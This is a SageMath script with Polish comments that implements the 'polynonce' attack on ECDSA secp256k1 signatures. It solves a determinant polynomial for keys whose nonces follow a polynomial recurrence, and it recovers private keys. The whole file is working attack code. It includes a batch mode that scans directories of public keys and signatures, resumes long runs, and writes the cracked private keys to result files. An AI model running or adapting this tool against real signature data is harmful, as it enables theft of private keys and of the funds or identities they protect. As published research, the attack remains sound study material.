#!/usr/bin/sage
"""
polynonce.sage -- atak POLYNONCE na ECDSA secp256k1 (Kudelski 2023).

IDEA: kolejne nonce jednego klucza spelniaja rekurencje WIELOMIANOWA
      k_{i+1} = c_0 + c_1*k_i + ... + c_L*k_i^L   (mod n)
      (typowe dla zepsutego PRNG/LCG). Nonce moga byc PELNEJ dlugosci i
      "losowe" bitowo -> krata HNP i FFT tego NIE widza. Ten atak lapie
      wlasnie takie przypadki.

MATEMATYKA:
  Z ECDSA:  k_i = z_i/s_i + (r_i/s_i)*d = a_i + b_i*d (mod n)  -- afiniczne w d.
  Dla rekurencji stopnia L, majac L+2 KOLEJNYCH podpisow, ukladamy macierz
      M[i][*] = [1, k_i, k_i^2, ..., k_i^L, k_{i+1}]   (rozmiar (L+2)x(L+2))
  Uklad ma rozwiazanie na c_* wtw det(M) = 0. Kazdy k_i = a_i + b_i*X jest
  wielomianem w X=d, wiec det(M) jest WIELOMIANEM w d. Szukamy pierwiastkow
  mod n i testujemy kazdy jako d wobec klucza publicznego (d*G == pub).

Wchodzi: {"x_y": [[r,s,z],...]} (hex), podpisy w KOLEJNOSCI (rekurencja!).

Uzycie:
  sage polynonce.sage --file klucz.json                 # stopnie 1..3, przesuwane okno
  sage polynonce.sage --file klucz.json --degree 1      # tylko LCG (najszybsze)
  sage polynonce.sage --dir /katalog --max-windows 5000
"""
from sage.all import *
import json, sys, time, argparse

n  = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
p  = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFC2F
Gx = 0x79BE667EF9DCBBAC55A06295CE870B07029BFCDB2DCE28D959F2815B16F81798
Gy = 0x483ADA7726A3C4655DA4FBFC0E1108A8FD17B448A68554199C47D08FFB10D4B8
E = EllipticCurve(GF(p), [0, 7])
G = E(Gx, Gy)
n = int(n)
Fn = GF(n)
PR = PolynomialRing(Fn, "X")
X = PR.gen()

def log(msg):
    print(f"[{time.strftime('%H:%M:%S')}] {msg}", flush=True)

def modinv(a):
    return int(pow(int(a) % n, -1, n))

def solve_window(a, b, degree, pub):
    """a,b: listy afiniczne k_i = a_i + b_i*d dla L+3 kolejnych podpisow.
    Zwraca d (int) albo None. degree = L (stopien rekurencji).

    Uklad: dla i=0..L+1 rownanie k_{i+1} = sum_j c_j*k_i^j (j=0..L).
    Macierz (L+2)x(L+2) kolumny [1,k_i,...,k_i^L, k_{i+1}]; det=0 => zaleznosc.
    Potrzeba WIERSZY=L+2, a kazdy uzywa k_i oraz k_{i+1} => L+3 nonców."""
    L = degree
    rows_needed = L + 2
    # k_i jako wielomiany w X (potrzeba indeksow 0..rows_needed = L+3 sztuk)
    K = [Fn(a[i]) + Fn(b[i]) * X for i in range(rows_needed + 1)]
    rows = []
    for i in range(rows_needed):
        row = [K[i] ** j for j in range(L + 1)]   # 1..k_i^L  (L+1 kolumn)
        row.append(K[i + 1])                       # k_{i+1}
        rows.append(row)
    M = matrix(PR, rows)
    det = M.det()
    if det == 0:
        return None                # zdegenerowany (rzadkie) -> pomijamy
    try:
        roots = det.roots(multiplicities=False)
    except Exception:
        return None
    for rt in roots:
        d = int(rt) % n
        if 1 <= d < n and d * G == pub:
            return d
    return None

def attack_key(key_xy, sigs, args):
    try:
        xh, yh = key_xy.split("_")
        pub = E(int(xh, 16), int(yh, 16))
    except Exception:
        log(f"  Zly klucz publiczny: {key_xy[:40]}"); return None

    a_all, b_all = [], []
    for r, s, z in sigs:
        if r == 0 or s == 0:
            continue
        sinv = modinv(s)
        a_all.append((z * sinv) % n)   # a_i = z/s
        b_all.append((r * sinv) % n)   # b_i = r/s
    total = len(a_all)
    if total < 4:
        return None
    log(f"Klucz {key_xy[:24]}..  podpisow: {total}")

    degrees = [args.degree] if args.degree else [1, 2, 3]
    for L in degrees:
        win = L + 3   # L+2 rownan, kazde uzywa k_i i k_{i+1} => L+3 noncow
        if total < win:
            continue
        nwin = total - win + 1
        if args.max_windows and nwin > args.max_windows:
            nwin = args.max_windows
        log(f"  stopien L={L}  okno={win}  okien={nwin}")
        for w in range(nwin):
            a = a_all[w:w + win]
            b = b_all[w:w + win]
            d = solve_window(a, b, L, pub)
            if d:
                log(f"  ZLAMANO! polynonce L={L} okno@{w}  d=0x{d:064x}")
                return {"key": key_xy, "privkey": f"0x{d:064x}",
                        "attack": "polynonce", "degree": L, "window": w}
            if (w + 1) % 2000 == 0:
                log(f"    L={L} okno {w+1}/{nwin}...")
    return None

def main():
    ap = argparse.ArgumentParser(description="Atak polynonce (rekurencja wielomianowa nonce).")
    src = ap.add_mutually_exclusive_group(required=True)
    src.add_argument("--file")
    src.add_argument("--dir")
    ap.add_argument("--out", default=None)
    ap.add_argument("--degree", type=int, default=None, help="tylko ten stopien L (1=LCG). dom. 1,2,3")
    ap.add_argument("--max-windows", type=int, default=0, help="limit okien na stopien. 0=bez")
    ap.add_argument("--resume", action="store_true",
                    help="wznow: pomijaj pliki juz przerobione (wg <out>.progress)")
    ap.add_argument("--progress-every", type=int, default=200,
                    help="loguj postep co N plikow. dom. 200")
    args = ap.parse_args()

    import glob, os
    if args.file:
        files = [args.file]; default_out = args.file.replace(".json", "_polynonce.json")
    else:
        files = sorted(glob.glob(os.path.join(args.dir, "*.json")))
        default_out = os.path.join(args.dir, "polynonce_results.json")
    out_fn = args.out or default_out
    if not files:
        log("Brak plikow."); sys.exit(1)

    # --- zapis na biezaco + wznawianie ---
    prog_fn = out_fn + ".progress"
    hits_fn = out_fn + ".hits.jsonl"
    def atomic_dump(obj, path):
        tmp = path + ".tmp"; json.dump(obj, open(tmp, "w"), indent=2); os.replace(tmp, path)
    results = []; done = set()
    if args.resume:
        if os.path.exists(prog_fn):
            done = set(l.strip() for l in open(prog_fn) if l.strip())
            log(f"WZNAWIANIE: {len(done)} plikow juz przerobionych.")
        if os.path.exists(hits_fn):
            for line in open(hits_fn):
                line = line.strip()
                if line:
                    try: results.append(json.loads(line))
                    except Exception: pass
            log(f"WZNAWIANIE: wczytano {len(results)} wczesniejszych trafien.")
    prog_f = open(prog_fn, "a"); hits_f = open(hits_fn, "a")

    t0 = time.time(); nf = len(files)
    for idx, fn in enumerate(files, 1):
        if args.resume and fn in done:
            continue
        try:
            data = json.load(open(fn))
        except Exception as e:
            log(f"BLAD {fn}: {e}"); prog_f.write(fn + "\n"); prog_f.flush(); continue
        if not isinstance(data, dict):
            prog_f.write(fn + "\n"); prog_f.flush(); continue   # pomijaj pliki wynikowe/nie-slowniki
        for key_xy, sig_list in data.items():
            sigs = [(int(r, 16), int(s, 16), int(z, 16)) for r, s, z in sig_list]
            res = attack_key(key_xy, sigs, args)
            if res:
                res["file"] = os.path.basename(fn)
                results.append(res)
                hits_f.write(json.dumps(res) + "\n"); hits_f.flush()
                atomic_dump(results, out_fn)
        prog_f.write(fn + "\n"); prog_f.flush()
        if idx % args.progress_every == 0:
            el = time.time() - t0
            log(f"[postep] {idx}/{nf} plikow, zlamano: {len(results)}, {el:.0f}s ({el/idx:.2f}s/plik)")
    prog_f.close(); hits_f.close()
    atomic_dump(results, out_fn)
    log(f"KONIEC ({time.time()-t0:.0f}s). Zlamano {len(results)} -> {out_fn}")

if __name__ == "__main__":
    main()
